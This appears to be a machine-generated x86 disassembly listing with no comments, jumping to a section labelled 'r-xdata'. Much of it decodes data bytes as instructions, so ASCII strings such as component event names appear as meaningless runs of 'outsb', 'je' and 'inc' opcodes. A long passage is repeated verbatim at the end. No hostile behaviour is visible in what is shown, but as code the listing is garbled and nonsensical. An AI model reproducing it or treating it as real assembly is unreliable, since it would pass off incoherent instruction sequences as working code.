or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
jo r-xdata
add bh bh
pop esp
or [ eax + eax + 0x1 ] al
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
or [ eax + eax ] eax
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
[ eax - 0x57ffbbf7 ]
jae r-xdata
add [ eax ] al
and [ ebx ] 0x0
or cl [ edi + 0x6e ]
push edi
jb r-xdata
add bh bh
add al ah
jb r-xdata
les eax [ edi ]
jo r-xdata
adc [ eax ] al
0x18ff0000 0x440a
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
push cs
push eax
popad
jb r-xdata
add bh bh
cwde
or [ eax + eax - 0x58 ] eax
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090026 ] al
inc esp
jb r-xdata
jo r-xdata
inc esp
add [ eax ] ah
sub [ eax + eax ] eax
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
or [ edx ] eax
add bh bh
add al 0x7f
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] al
or [ edi + 0x6f ] dl
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
movsb [ edi ] [ esi ]
add [ eax ] eax
outsb
jne r-xdata
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
mov ecx 0x9b0043
add bh bh
fwait
add [ eax ] al
inc [ ecx ]
dec ebx
jns r-xdata
mov al 0x78
js r-xdata
jo r-xdata
push ds
add [ edi ] al
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
js r-xdata
adc [ eax ] al
cdq
add [ eax ] al
push esp
or [ eax + eax - 0x44 ] eax
or [ eax + eax ] eax
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001c ] al
push 0x6948776f
outsb
je r-xdata
jb r-xdata
push 0x6948776f
outsb
je r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
mov ebx 0x1d80043
add bh bh
fadd [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ecx
mov al 0x78
mov esp 0xf00043
add bh bh
[ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0024 ] al
outsb
inc esp
jb r-xdata
adc [ eax ] al
push edi
add [ eax ] al
inc esp
pop es
js r-xdata
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ eax + 0x1 ] al
mov ecx 0x72600043
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
or dl [ eax + 0x61 ]
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001b ] al
outsd
stc
inc esp
add [ eax + eax ] bh
[ eax + ecx + 0x44 ]
add [ ecx ] al
loopne r-xdata
jo r-xdata
mov ebx 0xd80043
xor [ ebx + eax * 2 + 0x1e000 ] bh
jmp eax
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0b00
fadd [ eax ]
jb r-xdata
outsb
inc ebp
outsb
inc esp
jb r-xdata
dec edi
js r-xdata
add [ eax + 0x4f070027 ] al
add [ eax ] al
dec edi
jbe r-xdata
mov ebp 0x1180043
push eax
outsd
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002c ] al
outsb
dec ebp
outsd
jne r-xdata
mov ebx 0xd00043
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
or ecx [ edi + 0x6e ]
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
outsb
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060028 ] al
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : ecx ] cl
dec edi
jo r-xdata
je r-xdata
push ebp
jo r-xdata
arpl [ ebx + 0x54 ] bp
mov ebp 0x1100043
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or ecx [ edi + 0x6e ]
inc esp
outsd
ja r-xdata
insb
or [ gs : edx + 0x56 ] ebp
imul esi [ edx + 0x74 ] 0x126c6175
outsd
js r-xdata
push ebx
je r-xdata
dec edi
outsb
or [ ebx + 0xe00043 ] bh
add bh bh
add [ eax ] al
jmp eax
in al 0xbb
inc ebx
add al ch
add [ eax ] eax
jns r-xdata
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
and al [ eax ]
push cs
dec edi
outsb
inc ebx
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x64 ] bp
mov ebp 0x1080043
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0900
outsd
outsb
je r-xdata
inc esp
jb r-xdata
mov esp 0xe80043
add bh bh
call 0x2424ddd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0023 ] al
outsb
popad
outsb
popad
jb r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
int3
mov edi 0x1000043
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ ebx ] cl
dec edi
outsb
push ebx
je r-xdata
insb
bound edx [ esi + 0x69 ]
jb r-xdata
jb r-xdata
cmp [ ebx + 0xd80043 ] 0x0
adc eax 0x47424c54
jne r-xdata
popad
je r-xdata
outsb
inc ebp
js r-xdata
add bh bh
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
push es
dec edi
outsb
add [ eax ] al
add [ eax + 0x4f090025 ] al
outsd
outsb
je r-xdata
outsb
or [ edi ] al
adc [ edx + 0x4f ] ch
ja r-xdata
popad
jb r-xdata
inc ebx
inc esp
jb r-xdata
push 0x65
popad
je r-xdata
add [ eax + edx + 0x40 ] dl
add ah cl
adc [ eax ] al
insb
dec edi
jb r-xdata
je r-xdata
outsb
push ebx
je r-xdata
outsd
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
inc ebx
outsd
outsb
je r-xdata
add ecx [ eax ]
pop es
js r-xdata
outsd
outsb
je r-xdata
jb r-xdata
push esp
dec esp
inc edx
inc edi
imul edi [ eax + 0x65 ] 0x626c1364
dec edi
ja r-xdata
jb r-xdata
inc esp
outsd
inc ebp
jbe r-xdata
insb
jae r-xdata
je r-xdata
ror [ bx + 0x43 ] 0x1
push ebx
inc ebx
add [ edx + eax ] bh
add al ch
aam 0x43
add [ edx + eax + 0x34700042 ] ch
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
inc eax
outsb
je r-xdata
inc esp
popad
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x76 ] si
outsb
je r-xdata
jb r-xdata
int3
imul ebp [ esi + 0x67 ] 0x72745306
outsb
outsd
insb
add [ 0x65646e49 ] al
or [ edx ] ecx
inc esp
dec ecx
outsb
je r-xdata
popad
outsd
insb
add [ 0x65646e49 ] al
js r-xdata
je r-xdata
dec eax
push eax
inc ebx
jb r-xdata
int3
popad
je r-xdata
jb r-xdata
jb r-xdata
inc esp
popad
bound ebp [ ebp + 0x9 ]
insb
bound edx [ esi + 0x69 ]
jb r-xdata
inc ebx
outsd
outsb
je r-xdata
je r-xdata
outsb
add [ ebx ] al
or eax 0x73694c54
je r-xdata
inc ebx
add [ eax ] cl
andps xmm1 [ edx + eax * 2 + 0x47 ]
ror [ eax + 0x50 ] 0x43
je r-xdata
dec esp
inc edx
inc edi
or [ edi ] al
add cl [ eax ]
pop es
add [ eax ] al
mov dh 0x52
inc ebx
add [ esi ] bl
inc ebp
jbe r-xdata
add ecx [ eax ]
pop es
inc ebx
je r-xdata
lea eax [ eax ]
mov al [ 0x8004350 ]
ja r-xdata
add ah cl
inc ebx
xor [ eax ] eax
lodsb [ esi ]
mov [ ebx ] eax
fdivr [ ebx + 0x44 ]
adc [ eax ] al
add [ ecx * 8 + 0x10cc0043 ] ah
inc eax
add [ ebp + 0x51a40040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx * 2 + 0x53340043 ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x1e004352 ] dh
inc esp
add [ eax - 0x59 ] al
inc ecx
jb r-xdata
jb r-xdata
arpl [ eax + eax + 0x24 ] si
int 0x43
add [ eax + edx + 0x40 ] dl
add [ ecx + edx + 0x40 ] bl
add [ ebx + 0x435104c0 ] cl
dec edi
bound ebp [ edx + 0x65 ]
pop es
dec ecx
outsb
je r-xdata
jb r-xdata
popad
je r-xdata
add [ esp + eax * 2 ] eax
dec ecx
outsb
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
ja r-xdata
inc ebp
add al 0x44
jbe r-xdata
jb r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ gs : edi + eax + 0x54 ] si
push es
inc eax
add [ ebp + 0x50a00040 ] cl
inc ebx
add [ eax ] cl
jne r-xdata
add [ esp + ecx * 2 ] al
inc esp
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ ecx + ecx * 4 + 0x7bdc0043 ] ch
inc esp
xor al 0x40
outsd
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
mov eax eax
push ebx
je r-xdata
arpl [ edi + eax + 0x54 ] si
or al [ ecx + 0x74 ]
popad
js r-xdata
ja r-xdata
add [ eax ] cl
adc [ esp + ecx * 2 + 0x42 ] dl
inc esi
imul ebp [ esi + 0x64 ] 0x61746144
adc [ eax ] eax
mov eax eax
add al 0x51
inc ebx
imul ebp [ esi + 0x67 ] 0x43cd2400
push ebx
je r-xdata
ja r-xdata
insb
adc ch [ edx + 0x56 ]
imul esi [ edx + 0x74 ] 0x4f6c6175
outsd
insb
add [ edx ] cl
inc esi
imul ebp [ esi + 0x64 ] 0x69727453
outsb
push es
push ebx
je r-xdata
je r-xdata
inc ebx
popad
add [ eax + 0x29 ] ah
inc esp
add [ ebp + edi * 8 + 0x43 ] dh
add [ eax - 0x73ffbbd0 ] al
push es
inc esp
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
imul ebp [ esi + 0x67 ] 0x746e4907
sub_43473a
inc esp
add ah dl
test [ ebx ] sub_44cf40
xor al bh
inc ebx
add al ah
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x48
add [ eax - 0x8 ] dl
inc ebx
add [ eax - 0x31 ] dl
inc esp
add [ eax + 0x4400442d ] dh
stc
inc ebx
add [ ecx + edi * 8 - 0x78fffbd ] al
inc ebx
add [ edi + ecx * 8 + 0x44 ] ah
add [ eax - 0x31 ] ch
inc esp
add [ eax + edi * 8 - 0x9fbffbd ] dl
inc ebx
add [ ecx ] dl
push esp
inc edx
jne r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ecx * 2 + 0x48be0043 ] ah
inc ebx
add [ edx + eax ] cl
add [ eax ] al
jo r-xdata
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x47d4c08b
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
dec eax
inc ebx
add [ edx + eax + 0x34700042 ] ch
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
inc eax
add [ esp + ecx * 2 ] al
inc esp
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add ah bl
inc esp
add ah bl
jpo r-xdata
push es
inc esp
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
je r-xdata
add [ esi + ebp * 2 + 0x44 ] ch
add ah cl
inc ebx
inc esp
add [ eax - 0x59 ] al
inc ecx
add [ eax + 0x29 ] ah
inc esp
add [ ebp + edi * 8 + 0x43 ] dh
add [ eax - 0x73ffbbd0 ] al
inc esp
add [ esi + eax + 0x2c40044 ] cl
inc edx
add [ edi + edi * 8 - 0x5bffbf ] ch
inc ecx
add ah cl
add al [ edx ]
inc esp
jge r-xdata
inc esp
add [ edx + eax * 4 + 0x6d1c0044 ] ch
inc esp
add [ eax + esi * 2 + 0x44 ] al
add al ch
jge r-xdata
add al ah
sub eax [ eax + eax - 0x8 ]
outsb
inc esp
add [ edi + ebp * 2 + 0x6a780044 ] dh
inc esp
add [ eax - 0x7ffbb91 ] bl
xor [ eax + eax - 0x74 ] al
aaa
inc esp
add [ eax * 2 + 0x7ee00044 ] ch
inc ebx
add [ edx + eax * 2 ] dl
inc esp
add [ eax + eax * 2 + 0x44 ] al
add ah al
inc ebp
inc esp
add al cl
inc ebp
inc esp
add [ eax + 0x28004444 ] al
inc esp
inc esp
add al bl
jo r-xdata
inc esp
add al dh
jge r-xdata
add al dh
jbe r-xdata
outsd
insb
aam 0x47
add ah ch
jge r-xdata
add ah dl
dec eax
add [ eax + 0x4e ] dh
add [ eax ] dh
sti
inc ebx
add [ ebx + edi * 8 ] dh
inc ebx
add [ eax ] dh
sub eax [ eax + eax + 0x5c ]
sub eax [ eax + eax + 0x74 ]
push es
inc esp
add [ esp + edi * 8 + 0x8000043 ] ch
inc esp
add [ eax + 0x7 ] bh
inc esp
add [ edx + ecx + 0x9380044 ] cl
add [ esp + edi * 2 ] cl
inc esp
add [ eax + 0x7b ] bl
inc esp
add al ch
sti
inc ebx
add [ ecx + esi * 2 + 0x44 ] ch
add [ ecx + esi * 2 + 0x6e6c0044 ] cl
inc esp
add [ edi + edi * 8 - 0x5bffbf ] ch
inc ecx
add ah cl
add al [ edx ]
sbb [ edi + 0x43 ] bh
insb
jae r-xdata
inc ebx
add [ ecx * 8 + 0xb0043 ] ah
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
add [ eax + eax ] al
cmp [ ebp - 0x10ffec ] bh
fcos
push 0xb400437e
jle r-xdata
inc esp
add [ eax - 0x59 ] al
inc ecx
add [ eax + 0x29 ] ah
inc esp
add [ ebp + edi * 8 + 0x43 ] dh
je r-xdata
add al ah
sub eax [ eax + eax - 0x8 ]
outsb
inc esp
add [ edi + ebp * 2 + 0x6a780044 ] dh
inc esp
add [ eax - 0x7ffbb91 ] bl
xor [ eax + eax - 0x74 ] al
aaa
inc esp
add [ eax * 2 - 0x7fd3ffbc ] ch
inc ebx
add [ edx + eax * 2 ] dl
inc esp
add [ eax - 0x80 ] ch
inc ebx
add ah al
inc ebp
inc esp
add al cl
inc ebp
inc esp
add [ eax + 0x28004444 ] al
inc esp
inc esp
add al bl
jo r-xdata
add [ esp + edi * 2 ] cl
inc esp
add [ eax + 0x7b ] bl
inc esp
add al ch
sti
inc ebx
add [ ecx + esi * 2 + 0x44 ] ch
add [ ecx + esi * 2 + 0x6e6c0044 ] cl
inc esp
add [ ebp + 0x49480040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx * 2 + 0x43 ] bl
add [ eax - 0x1fffbc83 ] bl
jge r-xdata
add ah cl
inc ebx
outsb
inc ebx
outsd
outsb
je r-xdata
add [ ebx ] sub_437f7c
mov al [ 0x700437f ]
push esp
inc edx
jne r-xdata
add [ eax + 0x4e ] dh
inc esp
add [ edx + eax * 4 + 0x6d1c0044 ] ch
inc esp
add [ eax + esi * 2 + 0x44 ] al
add al ch
jge r-xdata
inc esp
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx * 2 ] bl
inc ebx
add [ esi + 0x4a ] cl
inc ebx
add [ eax ] bl
add al [ eax ]
add [ eax - 0x53ffbcb9 ] cl
add al [ edx ]
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
dec edx
inc ebx
add [ esi ] cl
push esp
inc edx
jne r-xdata
add [ eax - 0x73ffbbd0 ] al
push es
pushad
sub [ eax + eax + 0x74 ] eax
std
inc ebx
add dh bh
enter 0x4409 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax 0x69420800
je r-xdata
mov eax eax
pop esp
dec edx
add ah ch
jge r-xdata
add [ eax ] dh
sti
inc ebx
add [ ebx + edi * 8 ] dh
inc ebx
add [ eax ] dh
sub eax [ eax + eax + 0x5c ]
sub eax [ eax + eax + 0x74 ]
push es
inc esp
add [ esp + edi * 8 + 0x8000043 ] ch
inc esp
add [ eax + 0x7 ] bh
inc esp
add [ edx + ecx + 0x9380044 ] cl
add [ esi + ebp * 2 + 0x44 ] ch
add [ esp + ecx * 2 ] al
inc esp
add [ ecx + esi + 0x31d00040 ] dh
je r-xdata
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
imul ebp [ edi + 0x6e ] r-xdata
je r-xdata
push [ eax ]
outsb
push cs
add [ esi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
dec esp
mov ecx 0x8a40043
inc esp
add ah dl
or [ eax + eax - 0x60 ] al
sub [ eax + eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000f ] al
popad
jo r-xdata
add [ eax ] cl
inc edx
je r-xdata
inc ebx
add [ edi ] al
pop es
push esp
inc edx
jne r-xdata
add [ edi + edi * 2 + 0x80043 ] ah
add eax 0x7b006b0
mov al 0x11
mov ebp 0x14bd35
jmp r-xdata
js r-xdata
outsb
inc ebx
outsd
outsb
je r-xdata
add bh bh
js r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
adc [ edx ] eax
add bh bh
add [ eax + 0x4208000d ] al
outsb
dec eax
dec ecx
inc ebx
add al dl
dec eax
inc ebx
add [ ecx ] dh
add [ eax ] cl
push ebx
je r-xdata
dec eax
call [ eax + eax * 4 - 0x7efbffbd ]
inc ebx
add [ eax - 0x7fffbc7f ] cl
add [ ebx ] 0x8
add [ ebx ] 0xdc
inc ecx
add [ edi + edi * 8 + 0x2cc0041 ] ah
inc edx
add [ eax ] bl
jg r-xdata
inc eax
inc eax
add ah bl
inc esp
add ah bl
jpo r-xdata
xor [ eax ] eax
shl [ ecx ] 0x1
inc ebx
add [ edi ] al
push cs
push esp
inc edx
jne r-xdata
outsd
insb
lea eax [ eax ]
aam 0x48
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
pop es
inc esp
popa
jne r-xdata
inc esp
add [ ecx ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add [ ecx ] dl
add al [ eax ]
call [ ecx ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ edx + 0x69 ] al
inc ebx
je r-xdata
inc esp
add al dh
jge r-xdata
add al dh
jbe r-xdata
add [ eax ] dl
je r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
jb r-xdata
adc [ edx ] eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
jae r-xdata
inc esp
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add [ ecx ] bl
add bh bh
ror [ ecx ] 0x1
inc esp
mov dl 0x43
add [ edx + eax ] dl
add bh bh
adc al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ss
add [ ebx ] cl
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc al
sub [ eax + eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
and [ esi ] dl
inc edx
add [ eax ] ch
popad
dec ebp
outsd
add [ gs : eax ] dl
mov dl 0x43
add [ edx ] bh
add bh bh
jpe r-xdata
add [ eax ] al
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] dl
add al [ eax ]
popad
add [ eax ] al
add ah dh
mov [ ecx ] es
cmp al 0x0
add dh bh
sbb ah bh
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000b ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
movsb [ edi ] [ esi ]
mov ecx 0x610043
add bh bh
clc
sti
inc ebx
add [ esp + edi * 8 + 0x43 ] dl
add [ eax + 0x3 ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax - 0x80000000 ] al
sbb al 0x0
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
je r-xdata
dec eax
imul ebp [ esi + 0x74 ] r-xdata
jl r-xdata
insb
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0010 ] al
outsd
outsb
jae r-xdata
push 0x5f004177
add [ eax ] al
add [ eax ] dl
inc eax
add [ edi ] dl
imul ebp [ esi + 0x74 ] r-xdata
pushad
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
jo r-xdata
add bh bh
pop esp
or [ eax + eax + 0x1 ] al
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
or [ eax + eax ] eax
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
[ eax - 0x57ffbbf7 ]
jae r-xdata
add [ eax ] al
and [ ebx ] 0x0
or cl [ edi + 0x6e ]
push edi
jb r-xdata
add bh bh
add al ah
jb r-xdata
les eax [ edi ]
jo r-xdata
adc [ eax ] al
0x18ff0000 0x440a
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
push cs
push eax
popad
jb r-xdata
add bh bh
cwde
or [ eax + eax - 0x58 ] eax
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090026 ] al
inc esp
jb r-xdata
jo r-xdata
inc esp
add [ eax ] ah
sub [ eax + eax ] eax
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
or [ edx ] eax
add bh bh
add al 0x7f
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] al
or [ edi + 0x6f ] dl
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
movsb [ edi ] [ esi ]
add [ eax ] eax
outsb
jne r-xdata
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
mov ecx 0x9b0043
add bh bh
fwait
add [ eax ] al
inc [ ecx ]
dec ebx
jns r-xdata
mov al 0x78
js r-xdata
jo r-xdata
push ds
add [ edi ] al
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
js r-xdata
adc [ eax ] al
cdq
add [ eax ] al
push esp
or [ eax + eax - 0x44 ] eax
or [ eax + eax ] eax
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001c ] al
push 0x6948776f
outsb
je r-xdata
jb r-xdata
push 0x6948776f
outsb
je r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
mov ebx 0x1d80043
add bh bh
fadd [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ecx
mov al 0x78
mov esp 0xf00043
add bh bh
[ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0024 ] al
outsb
inc esp
jb r-xdata
adc [ eax ] al
push edi
add [ eax ] al
inc esp
pop es
js r-xdata
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ eax + 0x1 ] al
mov ecx 0x72600043
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
or dl [ eax + 0x61 ]
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001b ] al
outsd
stc
inc esp
add [ eax + eax ] bh
[ eax + ecx + 0x44 ]
add [ ecx ] al
loopne r-xdata
jo r-xdata
mov ebx 0xd80043
xor [ ebx + eax * 2 + 0x1e000 ] bh
jmp eax
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0b00
fadd [ eax ]
jb r-xdata
outsb
inc ebp
outsb
inc esp
jb r-xdata
dec edi
js r-xdata
add [ eax + 0x4f070027 ] al
add [ eax ] al
dec edi
jbe r-xdata
mov ebp 0x1180043
push eax
outsd
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002c ] al
outsb
dec ebp
outsd
jne r-xdata
mov ebx 0xd00043
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
or ecx [ edi + 0x6e ]
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
outsb
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060028 ] al
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : ecx ] cl
dec edi
jo r-xdata
je r-xdata
push ebp
jo r-xdata
arpl [ ebx + 0x54 ] bp
mov ebp 0x1100043
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or ecx [ edi + 0x6e ]
inc esp
outsd
ja r-xdata
insb
or [ gs : edx + 0x56 ] ebp
imul esi [ edx + 0x74 ] 0x126c6175
outsd
js r-xdata
push ebx
je r-xdata
dec edi
outsb
or [ ebx + 0xe00043 ] bh
add bh bh
add [ eax ] al
jmp eax
in al 0xbb
inc ebx
add al ch
add [ eax ] eax
jns r-xdata
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
and al [ eax ]
push cs
dec edi
outsb
inc ebx
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x64 ] bp
mov ebp 0x1080043
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0900
outsd
outsb
je r-xdata
inc esp
